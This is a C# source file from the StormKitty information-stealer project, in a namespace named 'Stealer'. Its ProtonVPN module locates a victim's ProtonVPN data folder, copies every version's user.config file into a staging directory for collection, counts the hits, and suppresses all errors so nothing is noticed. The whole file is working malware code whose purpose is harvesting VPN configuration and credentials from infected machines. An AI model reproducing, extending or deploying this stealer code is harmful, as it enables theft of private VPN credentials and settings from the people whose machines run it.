/* 
    Author : LimerBoy
    Github : github.com/LimerBoy/StormKitty
*/

using System;
using System.IO;

namespace Stealer
{
    internal sealed class ProtonVPN
    {
        // Save("ProtonVPN");
        public static void Save(string sSavePath)
        {
            // "ProtonVPN" directory path
            string vpn = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "ProtonVPN");
            // Stop if not exists
            if (!Directory.Exists(vpn))
                return;
            try
            {
                // Steal user.config files
                foreach (string dir in Directory.GetDirectories(vpn))
                    if (dir.Contains("ProtonVPN.exe"))
                        foreach (string version in Directory.GetDirectories(dir))
                        {
                            string config_location = version + "\\user.config";
                            string copy_directory = Path.Combine(
                                sSavePath, new DirectoryInfo(Path.GetDirectoryName(config_location)).Name);
                            if (!Directory.Exists(copy_directory))
                            {
                                Counter.VPN++;
                                Directory.CreateDirectory(copy_directory);
                                File.Copy(config_location, copy_directory + "\\user.config");
                            }
                        }
            }
            catch { }
        }
    }
}
